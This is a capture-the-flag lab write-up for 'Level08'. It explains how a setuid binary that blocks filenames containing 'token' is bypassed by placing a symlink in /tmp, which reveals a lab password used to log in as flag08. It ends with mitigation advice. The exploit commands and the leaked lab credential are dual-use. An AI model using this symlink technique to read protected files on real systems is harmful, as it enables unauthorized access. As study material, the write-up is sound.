# Level08: Symbolic Link Path Traversal Bypass

## Description
This level demonstrates a file access restriction bypass vulnerability. The binary restricts access to files containing "token" in the filename but fails to properly validate symbolic links, allowing an attacker to read protected files by creating a symlink with a name that doesn't contain the restricted string.

## Discovery Process

1. **Initial reconnaissance:**
   ```bash
   ls -la
   # Found: level08 (setuid binary), token (flag08 owned file)
   ```

2. **Analyzed the binary:**
   ```bash
   strings level08
   ```
   - Key findings:
   ```
   strstr
   token
   You may not access '%s'
   ```
   - The program uses `strstr()` to check if "token" appears in the filename argument

3. **Tested the restriction:**
   ```bash
   ./level08 token
   # Output: You may not access 'token'
   ```

## Steps to Exploit

1. **Create symbolic link from different directory:**
   ```bash
   cd /tmp
   ln -s /home/user/level08/token pass
   ```

2. **Execute binary with symlink:**
   ```bash
   /home/user/level08/level08 /tmp/pass
   ```
   - Retrieved token: `quif5eloekouj29ke0vouxean`

3. **Login as flag08:**
   ```bash
   su flag08
   # Password: quif5eloekouj29ke0vouxean
   getflag
   ```

## Impact
- Improper input validation allows bypassing file access restrictions
- Symbolic links can be used to access protected files when only filename is checked
- Attackers can read sensitive files by manipulating the path representation

## Mitigation
1. **Resolve symbolic links:** Use `realpath()` or `readlink()` to get the actual file path before validation
2. **Check canonical paths:** Validate the resolved absolute path, not just the user-supplied argument
3. **Proper access control:** Implement access checks based on actual file identity, not filename patterns
4. **Use secure functions:** Employ `open()` with proper flags and validate file descriptors before reading

